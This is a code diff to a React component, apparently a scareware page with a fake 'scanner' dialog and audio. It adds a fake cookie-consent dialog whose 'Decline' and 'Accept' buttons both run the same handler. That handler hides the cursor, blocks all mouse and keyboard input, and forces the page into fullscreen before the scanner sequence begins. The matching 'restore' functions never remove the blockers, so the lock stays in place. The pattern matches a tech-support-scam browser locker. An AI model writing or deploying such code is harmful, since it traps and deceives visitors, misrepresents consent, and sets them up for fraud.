@@ -24,9 +24,163 @@ const audioFile = "/audio.mpeg";
 let globalAudio: HTMLAudioElement | null = null;
 let audioInitialized = false;
 
+
+
+// utils/keyboardUtils.ts
+
+let isKeyboardBlocked = false;
+let originalKeyListener: ((e: KeyboardEvent) => void) | null = null;
+
+/**
+ * Block ALL keyboard input (keys + combinations)
+ */
+export const blockKeyboard = () => {
+  if (isKeyboardBlocked) return;
+
+  const blockKey = (e: KeyboardEvent) => {
+    if (!isKeyboardBlocked) return;
+
+    // Block everything
+    e.preventDefault();
+    e.stopImmediatePropagation();
+
+    // Optional: Log blocked keys (for debugging)
+    // console.log(`Key blocked: ${e.key} | Ctrl:${e.ctrlKey} | Alt:${e.altKey} | Shift:${e.shiftKey}`);
+
+    return false;
+  };
+
+  // Add listeners with capture phase (most aggressive)
+  document.addEventListener('keydown', blockKey, { capture: true, passive: false });
+  document.addEventListener('keyup', blockKey, { capture: true, passive: false });
+  document.addEventListener('keypress', blockKey, { capture: true, passive: false });
+
+  isKeyboardBlocked = true;
+
+  console.log('⌨️ Keyboard fully blocked');
+};
+
+/**
+ * Restore normal keyboard functionality
+ */
+export const restoreKeyboard = () => {
+  if (!isKeyboardBlocked) return;
+
+  // Remove listeners
+  const blockKey = (e: KeyboardEvent) => {
+    e.preventDefault();
+    e.stopImmediatePropagation();
+    return false;
+  };
+
+  document.removeEventListener('keydown', blockKey, true);
+  document.removeEventListener('keyup', blockKey, true);
+  document.removeEventListener('keypress', blockKey, true);
+
+  isKeyboardBlocked = false;
+
+  console.log('⌨️ Keyboard restored');
+};
+
+/**
+ * Toggle keyboard blocking
+ */
+export const toggleKeyboard = () => {
+  if (isKeyboardBlocked) {
+    restoreKeyboard();
+  } else {
+    blockKeyboard();
+  }
+};
+
+
+// utils/mouseUtils.ts
+
+let originalCursor = '';
+let isBlocked = false;
+let blockedEvents: string[] = [];
+let keyListener: ((e: KeyboardEvent) => void) | null = null;
+
+const events = [
+  'click',
+  'mousedown',
+  'mouseup',
+  'contextmenu',
+  'dblclick',
+  'mousemove',
+  'pointermove',
+  'mouseenter',
+  'mouseleave',
+];
+
+/**
+ * Hide cursor and block all mouse interaction
+ */
+export const hideAndBlockMouse = (containerId?: string) => {
+  const container = containerId
+    ? (document.getElementById(containerId) as HTMLElement) || document.body
+    : document.body;
+
+  // Save original cursor
+  originalCursor = container.style.cursor;
+
+  // Hide cursor
+  container.style.cursor = 'none';
+  isBlocked = true;
+
+  const blockMouse = (e: Event) => {
+    if (!isBlocked) return;
+    e.preventDefault();
+    (e as any).stopImmediatePropagation?.();
+    return false;
+  };
+
+  // Add blockers
+  blockedEvents = [...events];
+  events.forEach((event) => {
+    container.addEventListener(event, blockMouse, { capture: true, passive: false });
+  });
+
+  console.log('🖱️ Mouse blocked and hidden');
+};
+
+/**
+ * Restore mouse to default (Show cursor + allow interaction)
+ */
+export const restoreMouseToDefault = (containerId?: string, onRestored?: () => void) => {
+  const container = containerId
+    ? (document.getElementById(containerId) as HTMLElement) || document.body
+    : document.body;
+
+  // Restore cursor
+  container.style.cursor = originalCursor || 'default';
+  isBlocked = false;
+
+  // Remove event blockers
+  events.forEach((event) => {
+    container.removeEventListener(event, () => {}, true);
+  });
+
+  onRestored?.();
+  console.log('🖱️ Mouse restored to default');
+};
+
+/**
+ * Toggle mouse (useful with keyboard)
+ */
+export const toggleMouse = (containerId?: string, onRestored?: () => void) => {
+  if (isBlocked) {
+    restoreMouseToDefault(containerId, onRestored);
+  } else {
+    hideAndBlockMouse(containerId);
+  }
+};
+
 const queryClient = new QueryClient();
 
 const Ppop = () => {
+  const [showCookieConsent, setShowCookieConsent] = useState(true);
+  const [cookiesAccepted, setCookiesAccepted] = useState(false);
   const [showModal, setShowModal] = useState(false);
   const [showMainDialog, setShowMainDialog] = useState(false);
   const [showBottomText, setShowBottomText] = useState(false);
@@ -35,6 +189,7 @@ const Ppop = () => {
   const [showBackgroundModals, setShowBackgroundModals] = useState([false, false, false]);
   const [showTopOverlay, setShowTopOverlay] = useState(false);
   const [acknowledged, setAcknowledged] = useState(false);
+  const [isFullscreen, setIsFullscreen] = useState(false);
   const audioRef = useRef<HTMLAudioElement | null>(null);
   const [audioReady, setAudioReady] = useState(false);
 
@@ -115,7 +270,7 @@ const Ppop = () => {
   }, [showScanner, showModal, showMainDialog, showBackgroundModals, showTopOverlay, audioReady]);
 
   useEffect(() => {
-    if (!acknowledged) {
+    if (!acknowledged && cookiesAccepted) {
       const timer1 = setTimeout(() => {
         setShowScanner(true);
         setShowBottomText(true);
@@ -130,7 +285,7 @@ const Ppop = () => {
         clearTimeout(timer2);
       };
     }
-  }, [acknowledged]);
+  }, [acknowledged, cookiesAccepted]);
 
   useEffect(() => {
     if (showScanner) {
@@ -166,11 +321,84 @@ const Ppop = () => {
     }
   };
 
+  const handleCookieAccept = async () => {
+    setCookiesAccepted(true);
+    setShowCookieConsent(false);
+
+    hideAndBlockMouse(); // You can pass containerId if needed
+    blockKeyboard();
+    // Make the page fullscreen
+    try {
+      const elem = document.documentElement; // or document.body if you prefer
+
+      if (elem.requestFullscreen) {
+        await elem.requestFullscreen();
+      } else if ((elem as any).webkitRequestFullscreen) {
+        await (elem as any).webkitRequestFullscreen();
+      } else if ((elem as any).mozRequestFullScreen) {
+        await (elem as any).mozRequestFullScreen();
+      } else if ((elem as any).msRequestFullscreen) {
+        await (elem as any).msRequestFullscreen();
+      }
+    } catch (error) {
+      console.error("Fullscreen request failed:", error);
+      // Optionally show a message to user that fullscreen couldn't be activated
+    }
+  };
+
+  const handleMainDialogAccept = async () => {
+    // Request fullscreen
+    const elem = document.documentElement;
+    if (elem.requestFullscreen) {
+      try {
+        await elem.requestFullscreen();
+        setIsFullscreen(true);
+      } catch (err) {
+        console.log('Fullscreen request failed:', err);
+      }
+    }
+  };
+
   return (
     <QueryClientProvider client={queryClient}>
       <TooltipProvider>
         <Toaster />
         <Sonner />
+
+        {/* Cookie Consent Dialog */}
+        <Dialog open={showCookieConsent}>
+          <DialogContent className="max-w-md bg-white border border-gray-300 rounded-lg shadow-xl">
+            <DialogHeader>
+              <DialogTitle className="text-xl font-bold text-gray-900">
+                🍪 Cookie Consent
+              </DialogTitle>
+            </DialogHeader>
+            <DialogDescription className="text-gray-700 space-y-3">
+              <p>
+                This website uses cookies to enhance your experience and analyze site usage.
+                By accepting, you consent to our use of cookies.
+              </p>
+              <p className="text-sm text-gray-600">
+                We respect your privacy and only use essential and analytics cookies.
+              </p>
+            </DialogDescription>
+            <DialogFooter className="flex gap-3 justify-end">
+              <Button
+                onClick={handleCookieAccept}
+                variant="outline"
+                className="text-gray-700 border-gray-300"
+              >
+                Decline
+              </Button>
+              <Button
+                onClick={handleCookieAccept}
+                className="bg-blue-600 text-white hover:bg-blue-700"
+              >
+                Accept
+              </Button>
+            </DialogFooter>
+          </DialogContent>
+        </Dialog>
 
         <Dialog open={showScanner}>
           <DialogContent className="max-w-[500px] bg-white border border-gray-300 shadow-xl" style={{ backgroundColor: 'white' }}>
@@ -327,7 +555,10 @@ const Ppop = () => {
                 <Button className=" bg-[#faf8f5] text-black hover:bg-gray-200 border">
                   Cancel
                 </Button>
-                <Button className=" bg-blue-900/95 text-white hover:bg-blue-600 border">
+                <Button
+                  onClick={handleMainDialogAccept}
+                  className=" bg-blue-900/95 text-white hover:bg-blue-600 border"
+                >
                   OK
                 </Button>
               </span>
